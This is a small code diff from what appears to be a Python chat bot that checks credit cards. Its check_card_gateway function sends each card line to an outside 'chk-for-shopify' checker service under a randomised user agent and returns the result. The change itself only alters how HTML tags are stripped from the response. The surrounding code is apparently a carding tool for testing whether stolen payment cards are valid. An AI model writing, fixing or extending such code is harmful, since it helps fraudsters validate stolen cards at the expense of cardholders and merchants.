@@ -98,7 +98,7 @@ def check_card_gateway(cc_line):
         url = f"https://chk-for-shopify.onrender.com?lista={cc_line}"
         headers = {"User-Agent": generate_user_agent()}
         r = requests.get(url, headers=headers, timeout=20)
-        return clean_response(r.text.strip())
+        return r.text.strip().replace('<pre>', '').replace('</pre>', '')  # This line removes the tags
     except Exception as e:
         return f"❌ Error checking {cc_line}: {e}"
 
@@ -331,3 +331,4 @@ def keep_alive():
 
 keep_alive()
 bot.infinity_polling()
+
